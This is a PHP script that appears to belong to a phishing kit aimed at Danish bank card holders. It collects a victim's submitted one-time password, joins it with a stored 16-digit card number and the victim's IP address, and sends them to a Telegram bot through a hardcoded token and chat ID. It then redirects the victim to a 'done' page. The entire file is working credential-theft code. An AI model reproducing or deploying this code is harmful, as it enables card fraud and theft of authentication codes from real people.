﻿<?php
session_start();

$otp=$_POST["otp"];

$_SESSION['otp'] = $otp;


   function getIPAddress() {  
    //whether ip is from the share internet  
     if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
                $ip = $_SERVER['HTTP_CLIENT_IP'];  
        }  
    //whether ip is from the proxy  
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
     }  
//whether ip is from the remote address  
    else{  
             $ip = $_SERVER['REMOTE_ADDR'];  
     }  
     return $ip;  
}  
$ip = getIPAddress();  

$msg = "
----------- 🔐🇩🇰 OTP 2/RZLT 🇩🇰🔐 ----------------->

💳 CC    : ".$_SESSION['cc16']."

🔐 OTP 2 : ".$_SESSION['otp']."

IP : $ip

----------- 🔐🇩🇰 OTP 2/RZLT 🇩🇰🔐 ----------------->";

$token = "6039160288:AAELj7POP_QJm4Fp_IfFhiYXMXpEnR9iaek";
$data = [
    'text' => $msg,
    'chat_id' => '-948225816'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header("Location: done.php");
?>